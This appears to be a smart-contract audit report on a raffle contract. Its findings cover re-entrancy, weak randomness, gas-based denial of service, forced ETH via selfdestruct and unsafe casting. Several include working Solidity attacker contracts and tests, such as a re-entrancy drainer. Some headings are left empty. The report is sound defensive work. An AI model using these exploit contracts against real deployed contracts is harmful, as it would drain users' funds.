
### High

### [H-1] Re-entrancy Bug which causes users funds + protocol funds to be lost.

**Description:**
In the `PuffyRaffle::refund` function , when an attacker calls the refund , he create a contract that can re-enter the contract and keep receiving funds till the contract is drained. All the attacker need to do is to create a contract that has a fallback function that also calls the refund. so every time ETH is sent to the attackers contract, the fallback function get triggered and it keeps calling the refund till the balance of the contract is drained.

**Impact:** All users + protocol funds are drained

**Proof of Concept:**

<details>
<summary>Code</summary>

```solidity
///@notice Attacker contract
contract ReEntrancyAttacker {
    IPuffyRaffle raffle;
    constructor(address _raffle) {
        raffle = IPuffyRaffle(_raffle);
    }
    function refundAgain() public {
        while (address(raffle).balance != 0) {
            raffle.refund(0);
        }
    }

    fallback() external payable {
        refundAgain();
    }

}

///@notice Tests
function testRefundAllFundsInContract() public {
    ReEntrancyAttacker attackerCon = new ReEntrancyAttacker(
        address(puppyRaffle)
    );

    ///@notice attacker enters raffle
    address[] memory players = new address[](4);
    players[0] = address(attackerCon);
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    console.log("Balance of Attacker", address(attackerCon).balance);

    console.log("Balance of PuffyRaffle", address(puppyRaffle).balance);

    console.log("REFUNDING........");

    //attacker calls refund.
    attackerCon.refundAgain();

    console.log("Balance of Attacker", address(attackerCon).balance);

    console.log("Balance of PuffyRaffle", address(puppyRaffle).balance);
    }
```

</details>

**Recommended Mitigation:**
Adhere to the CEI , Checks Effects Interaction.

```diff
-  payable(msg.sender).sendValue(entranceFee);

-  players[playerIndex] = address(0);

+  players[playerIndex] = address(0);
+  payable(msg.sender).sendValue(entranceFee);
```

The Effects should come before any external calls.


### [H-2] Weak Randomness in the `PuffyRaffle::selectWinner` function, which can be manipulated by miners.
**Description:**
In the `PuffyRaffle::selectWinner` function, the randomness is generated using the `(msg.sender, block.timestamp, block.difficulty)`. This is a weak source of randomness as miners can manipulate the block.timestamp and block.difficulty to predict the randomness. This can be done by miners who have control over the block.timestamp and block.difficulty.

**Impact:**
Miners can predict the randomness and manipulate the selection of the winner.

**Proof of Concept:**
<details>
<summary>Code</summary>

Attacker contract:
```solidity
contract AttackerGameProtocol is IERC721Receiver {
    IPuffyRaffle raffle;
    constructor(address _raffle) payable {
        raffle = IPuffyRaffle(_raffle);
    }
    function attack(uint256 time, uint256 diff, uint256 pLength) public {
        uint256 winnerIndex = uint256(
            keccak256(abi.encodePacked(address(this), time, diff))
        ) % pLength;

        console.log("Winner Index", winnerIndex);

        console.log(
            "Attacker Index",
            raffle.getActivePlayerIndex(address(this))
        );

        raffle.selectWinner();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    fallback() external payable {}

    receive() external payable {}
}
```

Test:
```solidity
function testGameProtocol() public {
        AttackerGameProtocol attackerGame = new AttackerGameProtocol{
            value: 1 ether
        }(address(puppyRaffle));

        uint256 attackerConBalanceBefore = address(attackerGame).balance;
        uint256 tokenIdBefore = puppyRaffle.balanceOf(address(attackerGame));

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(attackerGame);
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.prank(address(attackerGame));

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        attackerGame.attack(block.timestamp, block.difficulty, 4);

        console.log("Attacker Balance Before", attackerConBalanceBefore);
        console.log("Attacker Balance After", address(attackerGame).balance);

        console.log("Owner of Token 0", puppyRaffle.ownerOf(0));
    }
```
</details>

**Recommended Mitigation:**
Use Chainlink VRF or other secure sources of randomness.

### [H-3] Overflow High Issue

### [H-4] Malicious Winner


### Medium

### [M-1] Denial of Service attack on the `PuffyRaffle::enterRaffle` function, which increases the amount of gas exponentially as `players` increases.

**Description:**
In the `PuffyRaffle::enterRaffle` function, the gas cost increases exponentially as the number of players increases. This is because the function loops through the `players` array which could be is an expensive operation. An attacker could create a contract that calls the `enterRaffle` function with a large number of players which will cause the function to run out of gas.

**Impact:**
The function will run out of gas and there denying users from using the protocol.

**Proof of Concept:**   Add this to the test suite:

<details>
<summary>POC</summary>

```solidity
function testDOS_Attack() public {
    uint256 firstPlayers = 10;

    //first 10 players
    address[] memory players = new address[](firstPlayers);
    for (uint256 i = 0; i < firstPlayers; i++) {
        players[i] = address(uint160(i));
    }

    uint256 gasLeftBefore = gasleft();

    puppyRaffle.enterRaffle{value: firstPlayers * entranceFee}(players);

    uint256 gasLeftAfter = gasleft();

    console.log("Gas Diff", gasLeftBefore - gasLeftAfter);

    uint256 secondPlayers = 100;

    ///second 100 players
    address[] memory second_players = new address[](secondPlayers);
    for (uint256 i = 0; i < secondPlayers; i++) {
        second_players[i] = address(uint160(secondPlayers + i));
    }

    uint256 gasLeftBeforeTwo = gasleft();

    puppyRaffle.enterRaffle{value: secondPlayers * entranceFee}(
        second_players
    );

    uint256 gasLeftAfterTwo = gasleft();

    console.log("Gas Diff", (gasLeftBeforeTwo - gasLeftAfterTwo));
    }
```

Output : We can see the gas cost increases exponentially as the number of players increases.

```javascript
Gas Diff 286208
Gas Diff 7070955
```

</details>

**Recommended Mitigation**
There are multiple ways to mitigate this:
* Protocol could add a cap to the number of players that can participate in the raffle.
* 



### [M-2] Protocol Can lose all protocol fee funds in the contract forever.

**Description:**
In the `PuffyRaffle::withdrawFees` function , the check for the balance to be equal to the `totalFees` in the contract will always fail if additional `ETH` is sent to the contract. Although the function does not have a `fallback` function to receive funds. An attacker could create a contract with `ETH` and call a `selfdestruct` which will push`ETH` to the contract. Thereby causing the protocol to lose the funds in the contract.

**Impact:**
All protocol fees will be lost forever.

**Proof of Concept:**

<details>

<summary>Code</summary>

```solidity
///@notice attacker contract
contract AttackerContract {
function attack(address victim) external payable {
    selfdestruct(payable(victim));
}

fallback() external payable {}

}

function testWithdrawShouldFailedWhenBalanceIsGreaterThanTotalFees() public playersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    puppyRaffle.selectWinner();

    //attack
    AttackerContract attackerCon = new AttackerContract();

    //send funds to attacker contract
    vm.deal(address(attackerCon), 3 ether);

    attackerCon.attack(address(puppyRaffle));

    vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
}
```

</details>

**Recommended Mitigation:** Change the require check.

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

+ require(totalFees != 0, "PuppyRaffle: Not enough fees!");
```


### [M-3] UnSafeCasting of `fees` to uint64 , causes overflow hence reducing the value of `totalFees`.

**Description**
The casting the fees to uint64 can overflow  `totalFees = totalFees + uint64(fee);`, when the value of fees increases. since a uint64 can only take up to 18.4..e18 values. so any value that goes beyond gets wrapped around. 

**Impact**
Some Protocol fees will be left int the contract, and since there is not function to remove excess funds this is a issue.

**Proof of Concept:**
Add this test to the test suite:
<details>
<summary>POC:</summary>

```solidity
function testOverflow() public {
    uint256 feeBefore = 10e18;

    console.log("Fee AFter", feeBefore);

    uint64 totalFeesBefore = uint64(feeBefore);

    console.log("Total Fees Before", totalFeesBefore);
    console.log("");

    console.log("Fee Increased.............");

    console.log("");

    uint256 feeAfter = feeBefore + 10e18;

    console.log("Fee", feeAfter);

    uint64 totalFeesAfter = uint64(feeAfter);

    console.log("Total Fees After", totalFeesAfter);
    }
```
</details>

**Recommended Mitigation**
There multiple ways to mitigate this issue:

* Use newer versions of solidity , since the compiler wont allow this `totalFees = totalFees + uint64(fee);` to compile.
* Use use OpenZeppelin's SafeCast to safely cast the fees.






### [NC-1] No checks for address validity, fees can be sent to a zero address

**Recommended Mitigation:** 
Add a require statement to check for address validity

```diff
function changeFeeAddress(address newFeeAddress) external onlyOwner {
+   require(newAddress!=address(0),"Invalid address");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```


### [NC-2] Variables that are set once , should be set to constant.


**Proof of Concept**

```javascript
string private commonImageUri =
    "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
string private rareImageUri =
    "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
string private legendaryImageUri =
    "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
```

**Recommended Mitigation:**
Change the variables to constant.

```diff
- string private commonImageUri =
+ string private constant commonImageUri =
    "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";

- string private rareImageUri =
+ string private constant rareImageUri =
    "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";

- string private legendaryImageUri =
+ string private constant legendaryImageUri =
    "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
```

### [NC-3] Do not Use magic numbers in the code.

**Proof of Concept**

```javascript
require(players.length >= 4, "PuppyRaffle: Need at least 4 players");

uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```

**Recommended Mitigation:**
Create a constant for the magic numbers.

```diff
+ uint256 constant MIN_PLAYERS = 4;
+ uint256 constant PRIZE_POOL_PERCENTAGE = 80;
+ uint256 constant FEE_PERCENTAGE = 20;
+ uint256 constant PRECISION = 100;
```

### [NC-4] Use `address(this).balance` instead of ` uint256 totalAmountCollected = players.length * entranceFee;` to get the balance of the contract.

**Proof of Concept**

```javascript
uint256 totalAmountCollected = players.length * entranceFee;
```

**Recommended Mitigation:**

```diff
- uint256 totalAmountCollected = players.length * entranceFee;
+ uint256 totalAmountCollected = address(this).balance;
```

### [NC-5] Unused code should be removed, to reduce contract code size.

**Proof of Concept**

```javascript
 function _isActivePlayer() internal view returns (bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == msg.sender) {
                return true;
        }
    }
    return false;
 }
```

**Recommended Mitigation:**
Remove the unused code.


### [NC-6] Use Events to log important contract state changes.

**Description:**
Events are a way to log important contract state changes. They are useful for dApps to listen to these events and update the UI accordingly. `PuppyRaffle::withdrawFees` and `PuppyRaffle::selectWinner` functions do not emit any events.

**Recommended Mitigation:**
Add events to log important contract state changes.


### [NC-7] Events parameters should be indexed, to make it easier to filter events.

**Description:**
Events parameters should be indexed, to make it easier to filter events. `PuppyRaffle::enterRaffle`,`PuppyRaffle::refund` and `PuppyRaffle::changeFeeAddress` event does not have any indexed parameters.

**Recommended Mitigation:**
Add indexed parameters to the events.


### [NC-8] erroneous 'getActivePlayerIndex' function